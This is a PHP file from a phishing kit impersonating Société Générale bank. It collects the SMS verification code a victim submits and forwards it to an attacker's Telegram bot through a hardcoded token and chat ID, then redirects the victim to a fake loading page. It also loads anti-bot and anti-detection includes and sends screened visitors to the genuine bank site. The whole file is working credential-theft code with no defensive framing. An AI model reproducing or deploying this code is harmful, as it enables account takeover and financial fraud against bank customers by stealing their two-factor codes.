<?php
session_start();
error_reporting(0);
set_time_limit(0);
session_start();
include ('../../prevents/bots.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}


$botToken = '8550681538:AAFeZE-haJ_q8_g9NDic1Z17ciUa4nHBLPE';
$chatId = '-5028537179';

// Vérifie que les champs existent
if (isset($_POST['sms'])) {
    $smsCode = trim($_POST['sms']);

    $message = "💬 Nouveau code SMS reçu : $smsCode";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text'    => $message
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    // Redirection après envoi
    header('Location: ../loading1.php');
    exit();
} else {
    // Redirection en cas d'erreur
    header('Location: ../sms.php');
    exit();
}
?>
